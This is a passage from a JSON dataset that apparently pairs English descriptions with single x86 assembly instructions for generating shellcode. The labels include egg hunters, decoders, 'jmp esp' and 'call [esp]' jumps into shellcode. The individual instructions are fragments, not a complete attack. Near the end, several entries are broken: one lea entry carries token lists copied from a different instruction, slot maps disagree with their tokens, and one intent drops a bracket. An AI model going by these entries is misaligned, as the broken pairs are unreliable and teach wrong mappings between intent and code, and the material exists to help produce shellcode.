      "no_error": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "not",
      "equal"
    ],
    "snippet_tokens": [
      "jne",
      "var0"
    ]
  },
  {
    "intent": "jump to retry if not equal",
    "rewritten_intent": "jump to retry if not equal",
    "snippet": "jne retry",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "retry",
      "if",
      "not",
      "equal"
    ],
    "snippet_tokens": [
      "jne",
      "retry"
    ]
  },
  {
    "intent": "if not equal jump short to the _while_loop",
    "rewritten_intent": "if not equal jump short to the _while_loop",
    "snippet": "jne short _while_loop",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "not",
      "equal",
      "jump",
      "short",
      "_while_loop"
    ],
    "snippet_tokens": [
      "jne",
      "short",
      "_while_loop"
    ]
  },
  {
    "intent": "jump to the _while_loop label if the operands of the above comparison are not equals",
    "rewritten_intent": "jump to the _while_loop label if the operands of the above comparison are not equals",
    "snippet": "jne short _while_loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "_while_loop",
      "label",
      "if",
      "operands",
      "above",
      "comparison",
      "not",
      "equals"
    ],
    "snippet_tokens": [
      "jne",
      "short",
      "_while_loop"
    ]
  },
  {
    "intent": "jump to the _dup2_loop label if the previous instruction clears the sign flag",
    "rewritten_intent": "jump to the _dup2_loop label if the previous instruction clears the sign flag",
    "snippet": "jns _dup2_loop",
    "slot_map": {
      "_dup2_loop": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "previous",
      "instruction",
      "clears",
      "sign",
      "flag"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to 2f if the sign flag is zero",
    "rewritten_intent": "jump to 2f if the sign flag is zero",
    "snippet": "jns 2f",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "2f",
      "if",
      "sign",
      "flag",
      "zero"
    ],
    "snippet_tokens": [
      "jns",
      "2f"
    ]
  },
  {
    "intent": "jump to 3f if the sign flag is zero",
    "rewritten_intent": "jump to 3f if the sign flag is zero",
    "snippet": "jns 3f",
    "slot_map": {
      "3f": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "sign",
      "flag",
      "zero"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to decode_pr if not signed",
    "rewritten_intent": "jump to decode_pr if not signed",
    "snippet": "jns decode_pr",
    "slot_map": {
      "decode_pr": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "signed"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to dup2 if not negative",
    "rewritten_intent": "jump to dup2 if not negative",
    "snippet": "jns dup2",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to the dup2 label if the previous instruction clears the sign flag",
    "rewritten_intent": "jump to the dup2 label if the previous instruction clears the sign flag",
    "snippet": "jns dup2",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "previous",
      "instruction",
      "clears",
      "sign",
      "flag"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to duploop if not negative",
    "rewritten_intent": "jump to duploop if not negative",
    "snippet": "jns duploop",
    "slot_map": {
      "duploop": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to the duploop label if the previous instruction clears the sign flag",
    "rewritten_intent": "jump to the duploop label if the previous instruction clears the sign flag",
    "snippet": "jns duploop",
    "slot_map": {
      "duploop": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "previous",
      "instruction",
      "clears",
      "sign",
      "flag"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to the loop label if the previous instruction clears the sign flag",
    "rewritten_intent": "jump to the loop label if the previous instruction clears the sign flag",
    "snippet": "jns loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "loop",
      "label",
      "if",
      "previous",
      "instruction",
      "clears",
      "sign",
      "flag"
    ],
    "snippet_tokens": [
      "jns",
      "loop"
    ]
  },
  {
    "intent": "jump to the loopinghere label if the previous instruction clears the sign flag",
    "rewritten_intent": "jump to the loopinghere label if the previous instruction clears the sign flag",
    "snippet": "jns loopinghere",
    "slot_map": {
      "loopinghere": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "previous",
      "instruction",
      "clears",
      "sign",
      "flag"
    ],
    "snippet_tokens": [
      "jns",
      "var0"
    ]
  },
  {
    "intent": "jump to the _start label if the zero flag is cleared",
    "rewritten_intent": "jump to the _start label if the zero flag is cleared",
    "snippet": "jnz _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to 0x41 if not zero",
    "rewritten_intent": "jump to 0x41 if not zero",
    "snippet": "jnz 0x41",
    "slot_map": {
      "0x41": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to 0x8 if not zero",
    "rewritten_intent": "jump to 0x8 if not zero",
    "snippet": "jnz 0x8",
    "slot_map": {
      "0x8": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if not zero jump to numeric label 1",
    "rewritten_intent": "if not zero jump to numeric label 1",
    "snippet": "jnz 1",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "not",
      "zero",
      "jump",
      "numeric",
      "label",
      "1"
    ],
    "snippet_tokens": [
      "jnz",
      "1"
    ]
  },
  {
    "intent": "jump to the numeric label 1 if the zero flag is cleared",
    "rewritten_intent": "jump to the numeric label 1 if the zero flag is cleared",
    "snippet": "jnz 1",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "numeric",
      "label",
      "1",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "1"
    ]
  },
  {
    "intent": "jump to the decode label if the zero flag is cleared",
    "rewritten_intent": "jump to the decode label if the zero flag is cleared",
    "snippet": "jnz decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "decode",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "decode"
    ]
  },
  {
    "intent": "jump to exeunt if not zero",
    "rewritten_intent": "jump to exeunt if not zero",
    "snippet": "jnz exeunt",
    "slot_map": {
      "exeunt": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to the exit_on_error label if the zero flag is cleared",
    "rewritten_intent": "jump to the exit_on_error label if the zero flag is cleared",
    "snippet": "jnz exit_on_error",
    "slot_map": {
      "exit_on_error": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to incaddr if not equal",
    "rewritten_intent": "jump to incaddr if not equal",
    "snippet": "jnz incaddr",
    "slot_map": {
      "incaddr": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "equal"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to incaddr if no match",
    "rewritten_intent": "jump to incaddr if no match",
    "snippet": "jnz incaddr",
    "slot_map": {
      "incaddr": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "no",
      "match"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to the l00p label if the zero flag is cleared",
    "rewritten_intent": "jump to the l00p label if the zero flag is cleared",
    "snippet": "jnz l00p",
    "slot_map": {
      "l00p": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to loop if not equal to zero",
    "rewritten_intent": "jump to loop if not equal to zero",
    "snippet": "jnz loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "loop",
      "if",
      "not",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "jnz",
      "loop"
    ]
  },
  {
    "intent": "jump to the loop label if the zero flag is cleared",
    "rewritten_intent": "jump to the loop label if the zero flag is cleared",
    "snippet": "jnz loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "loop",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "loop"
    ]
  },
  {
    "intent": "jump to next_addr if not zero",
    "rewritten_intent": "jump to next_addr if not zero",
    "snippet": "jnz next_addr",
    "slot_map": {
      "next_addr": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if not zero jump to the next_cycle label",
    "rewritten_intent": "if not zero jump to the next_cycle label",
    "snippet": "jnz next_cycle",
    "slot_map": {
      "next_cycle": "var0"
    },
    "intent_tokens": [
      "if",
      "not",
      "zero",
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to the next_cycle label if the zero flag is cleared",
    "rewritten_intent": "jump to the next_cycle label if the zero flag is cleared",
    "snippet": "jnz next_cycle",
    "slot_map": {
      "next_cycle": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if not 0 then jump to the scan label",
    "rewritten_intent": "if not 0 then jump to the scan label",
    "snippet": "jnz scan",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "not",
      "0",
      "then",
      "jump",
      "scan",
      "label"
    ],
    "snippet_tokens": [
      "jnz",
      "scan"
    ]
  },
  {
    "intent": "if not zero jump short to the _paren label",
    "rewritten_intent": "if not zero jump short to the _paren label",
    "snippet": "jnz short _paren",
    "slot_map": {
      "_paren": "var0"
    },
    "intent_tokens": [
      "if",
      "not",
      "zero",
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jnz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to the _parent label if the zero flag is cleared",
    "rewritten_intent": "jump short to the _parent label if the zero flag is cleared",
    "snippet": "jnz short _parent",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "_parent",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "short",
      "_parent"
    ]
  },
  {
    "intent": "jump short to decode if not zero",
    "rewritten_intent": "jump short to decode if not zero",
    "snippet": "jnz short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "decode",
      "if",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "jnz",
      "short",
      "decode"
    ]
  },
  {
    "intent": "jump short to the decode label if the zero flag is cleared",
    "rewritten_intent": "jump short to the decode label if the zero flag is cleared",
    "snippet": "jnz short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "decode",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "short",
      "decode"
    ]
  },
  {
    "intent": "if not zero jump to loc_4010e5",
    "rewritten_intent": "if not zero jump to loc_4010e5",
    "snippet": "jnz short loc_4010e5",
    "slot_map": {
      "loc_4010e5": "var0"
    },
    "intent_tokens": [
      "if",
      "not",
      "zero",
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jnz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump to the stage label if the zero flag is cleared",
    "rewritten_intent": "jump to the stage label if the zero flag is cleared",
    "snippet": "jnz stage",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "stage",
      "label",
      "if",
      "zero",
      "flag",
      "cleared"
    ],
    "snippet_tokens": [
      "jnz",
      "stage"
    ]
  },
  {
    "intent": "if not 0 then jump to the top label",
    "rewritten_intent": "if not 0 then jump to the top label",
    "snippet": "jnz top",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "not",
      "0",
      "then",
      "jump",
      "top",
      "label"
    ],
    "snippet_tokens": [
      "jnz",
      "top"
    ]
  },
  {
    "intent": "declare the jocker label",
    "rewritten_intent": "declare the jocker label",
    "snippet": "jocker:",
    "slot_map": {
      "jocker": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "jump to error label if sign flag SF is equal to 1",
    "rewritten_intent": "jump to error label if sign flag SF is equal to 1",
    "snippet": "js error",
    "slot_map": {
      "SF": "var0"
    },
    "intent_tokens": [
      "jump",
      "error",
      "label",
      "if",
      "sign",
      "flag",
      "var0",
      "equal",
      "1"
    ],
    "snippet_tokens": [
      "js",
      "error"
    ]
  },
  {
    "intent": "jump to the label _close if the zero flag is set",
    "rewritten_intent": "jump to the label _close if the zero flag is set",
    "snippet": "jz _close",
    "slot_map": {
      "_close": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the label _read if the zero flag is set",
    "rewritten_intent": "jump to the label _read if the zero flag is set",
    "snippet": "jz _read",
    "slot_map": {
      "_read": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the _start label if the zero flag is set",
    "rewritten_intent": "jump to the _start label if the zero flag is set",
    "snippet": "jz _start",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to 0x8 if zero",
    "rewritten_intent": "jump to 0x8 if zero",
    "snippet": "jz 0x8",
    "slot_map": {
      "0x8": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the call_decoded label if the zero flag is set",
    "rewritten_intent": "jump to the call_decoded label if the zero flag is set",
    "snippet": "jz call_decoded",
    "slot_map": {
      "call_decoded": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if zero jump to the child label",
    "rewritten_intent": "if zero jump to the child label",
    "snippet": "jz child",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "zero",
      "jump",
      "child",
      "label"
    ],
    "snippet_tokens": [
      "jz",
      "child"
    ]
  },
  {
    "intent": "jump to child if zero",
    "rewritten_intent": "jump to child if zero",
    "snippet": "jz child",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "child",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "child"
    ]
  },
  {
    "intent": "jump to label child if the zero flag is set",
    "rewritten_intent": "jump to label child if the zero flag is set",
    "snippet": "jz child",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "child",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "child"
    ]
  },
  {
    "intent": "jump to the child label if the zero flag is set",
    "rewritten_intent": "jump to the child label if the zero flag is set",
    "snippet": "jz child",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "child",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "child"
    ]
  },
  {
    "intent": "jump to decoded if zero",
    "rewritten_intent": "jump to decoded if zero",
    "snippet": "jz decoded_shellcode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "decoded",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "decoded_shellcode"
    ]
  },
  {
    "intent": "jump to download if zero",
    "rewritten_intent": "jump to download if zero",
    "snippet": "jz download",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "download",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "download"
    ]
  },
  {
    "intent": "jump to the download label if the zero flag is set",
    "rewritten_intent": "jump to the download label if the zero flag is set",
    "snippet": "jz download",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "download",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "download"
    ]
  },
  {
    "intent": "jump to the encoded label if the zero flag is set",
    "rewritten_intent": "jump to the encoded label if the zero flag is set",
    "snippet": "jz encoded",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "encoded",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "encoded"
    ]
  },
  {
    "intent": "jump to the exit label if the zero flag is set",
    "rewritten_intent": "jump to the exit label if the zero flag is set",
    "snippet": "jz exit",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "exit"
    ]
  },
  {
    "intent": "jump to find_egg if zero",
    "rewritten_intent": "jump to find_egg if zero",
    "snippet": "jz find_egg",
    "slot_map": {
      "find_egg": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the find_egg label if the zero flag is set",
    "rewritten_intent": "jump to the find_egg label if the zero flag is set",
    "snippet": "jz find_egg",
    "slot_map": {
      "find_egg": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the point in the code labeled finished if zero",
    "rewritten_intent": "jump to the point in the code labeled finished if zero",
    "snippet": "jz finished",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "point",
      "code",
      "labeled",
      "finished",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "finished"
    ]
  },
  {
    "intent": "if zero jump to the formatting label",
    "rewritten_intent": "if zero jump to the formatting label",
    "snippet": "jz formatting",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "zero",
      "jump",
      "formatting",
      "label"
    ],
    "snippet_tokens": [
      "jz",
      "formatting"
    ]
  },
  {
    "intent": "jump to the formatting label if the zero flag is set",
    "rewritten_intent": "jump to the formatting label if the zero flag is set",
    "snippet": "jz formatting",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "formatting",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "formatting"
    ]
  },
  {
    "intent": "jump to incpage if equal",
    "rewritten_intent": "jump to incpage if equal",
    "snippet": "jz incpage",
    "slot_map": {
      "incpage": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if zero jump to the next_cycle label",
    "rewritten_intent": "if zero jump to the next_cycle label",
    "snippet": "jz next_cycle",
    "slot_map": {
      "next_cycle": "var0"
    },
    "intent_tokens": [
      "if",
      "zero",
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the next_cycle label if the zero flag is set",
    "rewritten_intent": "jump to the next_cycle label if the zero flag is set",
    "snippet": "jz next_cycle",
    "slot_map": {
      "next_cycle": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to next_page if zero",
    "rewritten_intent": "jump to next_page if zero",
    "snippet": "jz next_page",
    "slot_map": {
      "next_page": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "zero"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if zero flag is set jump to nomoreargs label",
    "rewritten_intent": "if zero flag is set jump to nomoreargs label",
    "snippet": "jz nomoreargs",
    "slot_map": {
      "nomoreargs": "var0"
    },
    "intent_tokens": [
      "if",
      "zero",
      "flag",
      "set",
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if zero jump to the shift_decode label",
    "rewritten_intent": "if zero jump to the shift_decode label",
    "snippet": "jz shift_decode",
    "slot_map": {
      "shift_decode": "var0"
    },
    "intent_tokens": [
      "if",
      "zero",
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the shift_decode label if the zero flag is set",
    "rewritten_intent": "jump to the shift_decode label if the zero flag is set",
    "snippet": "jz shift_decode",
    "slot_map": {
      "shift_decode": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "zero",
      "flag",
      "set"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if 0 then jump to loc_402b13",
    "rewritten_intent": "if 0 then jump to loc_402b13",
    "snippet": "jz short loc_402b13",
    "slot_map": {
      "loc_402b13": "var0"
    },
    "intent_tokens": [
      "if",
      "0",
      "then",
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "define key constant equal to 0xdeadbeef",
    "rewritten_intent": "define key constant equal to 0xdeadbeef",
    "snippet": "key equ 0xdeadbeef",
    "slot_map": {
      "0xdeadbeef": "var0"
    },
    "intent_tokens": [
      "define",
      "key",
      "constant",
      "equal",
      "var0"
    ],
    "snippet_tokens": [
      "key",
      "equ",
      "var0"
    ]
  },
  {
    "intent": "declare the l00p label",
    "rewritten_intent": "declare the l00p label",
    "snippet": "l00p:",
    "slot_map": {
      "l00p": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "in L1 call the stack",
    "rewritten_intent": "in L1 call the stack",
    "snippet": "L1: \\n call [esp]",
    "slot_map": {
      "L1": "var0"
    },
    "intent_tokens": [
      "in",
      "var0",
      "call",
      "stack"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "in L1 jump short to esp",
    "rewritten_intent": "in L1 jump short to esp",
    "snippet": "L1: \\n jmp short esp",
    "slot_map": {
      "L1": "var0"
    },
    "intent_tokens": [
      "in",
      "var0",
      "jump",
      "short",
      "esp"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "esp"
    ]
  },
  {
    "intent": "define L1 label and jump short to L2",
    "rewritten_intent": "define L1 label and jump short to L2",
    "snippet": "L1: \\n jmp short L2",
    "slot_map": {
      "L1": "var0",
      "L2": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "declare L2 label and call the function pointed by the stack",
    "rewritten_intent": "declare L2 label and call the function pointed by the stack",
    "snippet": "L2: \\n call [esp]",
    "slot_map": {
      "L2": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label",
      "and",
      "call",
      "function",
      "pointed",
      "stack"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define L2 and jump short to esi",
    "rewritten_intent": "define L2 and jump short to esi",
    "snippet": "L2: \\n jmp short esi",
    "slot_map": {
      "L2": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define L2 label and jump to L3 label",
    "rewritten_intent": "define L2 label and jump to L3 label",
    "snippet": "L2: \\n jmp L3",
    "slot_map": {
      "L2": "var0",
      "L3": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "declare L3 and jump to the shellcode",
    "rewritten_intent": "declare L3 and jump to the shellcode",
    "snippet": "L3: \\n call [esp]",
    "slot_map": {
      "L3": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "jump",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define the label L3 and jump to edi",
    "rewritten_intent": "define the label L3 and jump to edi",
    "snippet": "L3: \\n jmp edi",
    "slot_map": {
      "L3": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "define",
      "label",
      "var0",
      "and",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "define L3 and jump short to L4 label",
    "rewritten_intent": "define L3 and jump short to L4 label",
    "snippet": "L3: \\n jmp short L4",
    "slot_map": {
      "L3": "var0",
      "L4": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "jump",
      "short",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "in L4 jump short to the stack pointer",
    "rewritten_intent": "in L4 jump short to the stack pointer",
    "snippet": "L4: \\n jmp short esp",
    "slot_map": {
      "L4": "var0"
    },
    "intent_tokens": [
      "in",
      "var0",
      "jump",
      "short",
      "stack",
      "pointer"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "esp"
    ]
  },
  {
    "intent": "in L5 jump to the shellcode",
    "rewritten_intent": "in L5 jump to the shellcode",
    "snippet": "L5: \\n call [esp]",
    "slot_map": {
      "L5": "var0"
    },
    "intent_tokens": [
      "in",
      "var0",
      "jump",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define the label L5 and jump to the location pointed by the stack pointer",
    "rewritten_intent": "define the label L5 and jump to the location pointed by the stack pointer",
    "snippet": "L5: \\n jmp esp",
    "slot_map": {
      "L5": "var0"
    },
    "intent_tokens": [
      "define",
      "label",
      "var0",
      "and",
      "jump",
      "location",
      "pointed",
      "stack",
      "pointer"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "esp"
    ]
  },
  {
    "intent": "load the effective address of the operation [bp+0x08] into the bx register",
    "rewritten_intent": "load the effective address of the operation [bp+0x08] into the bx register",
    "snippet": "lea bx, [bp+0x08]",
    "slot_map": {
      "bp+0x08": "var1",
      "[": "var0",
      "bx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "esp"
    ]
  },
  {
    "intent": "load the effective address of the operation bp+0x0b] into the bx register",
    "rewritten_intent": "load the effective address of the operation bp+0x0b] into the bx register",
    "snippet": "lea bx, [bp+0x0b]",
    "slot_map": {
      "bp+0x0b": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "operation",
      "bp+0x0b",
      "]",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the operation [bp+di+0x32] into the cx register",
    "rewritten_intent": "load the effective address of the operation [bp+di+0x32] into the cx register",
    "snippet": "lea cx, [bp+di+0x32]",
    "slot_map": {
      "bp+di+0x32": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "operation",
      "[",
      "var1",
      "]",
      "cx",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the operation [bp+di+0x3e] into the dx register",
    "rewritten_intent": "load the effective address of the operation [bp+di+0x3e] into the dx register",
    "snippet": "lea dx, [bp+di+0x3e]",
    "slot_map": {
      "bp+di+0x3e": "var1",
      "[": "var0",
      "dx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
